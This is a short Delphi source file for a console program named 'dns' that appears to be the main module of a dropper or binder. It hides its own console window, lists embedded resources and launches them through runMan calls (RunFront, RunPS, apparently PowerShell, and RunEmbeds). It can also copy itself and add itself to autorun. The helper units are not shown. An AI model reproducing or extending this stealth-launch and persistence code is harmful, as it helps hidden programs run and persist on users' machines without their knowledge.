program dns;

{$APPTYPE CONSOLE}
 
uses
  Windows,
  SysUtils,
  ShellAPI,
  ActiveX,
  Variants,
  Classes,
  registry,
  ComObj,
  init in 'init.pas',
  embeddingsMan in 'embeddingsMan.pas',
  _front in '_front.pas',
  _embeddings in '_embeddings.pas',
   {$IFDEF USE_AUTOSTART}
    autorun in 'autorun.pas',
    {$ENDIF}
  runMan in 'runMan.pas';


function GetConsoleWindow: HWND; stdcall; external 'kernel32.dll';


procedure HideConsoleWindow;
var
  ConsoleWnd: HWND;
begin
  ConsoleWnd := GetConsoleWindow;
  if ConsoleWnd <> 0 then
    ShowWindow(ConsoleWnd, SW_HIDE);
end;

begin
  HideConsoleWindow;
  CoInitialize(nil);
  ListResources();
  runMan.RunFront;
  runMan.RunPS;
  runMan.RunEmbeds;
    {$IFDEF USE_AUTOSTART}
  CopyFileAndAddToAutorun;
            {$ENDIF}
end.

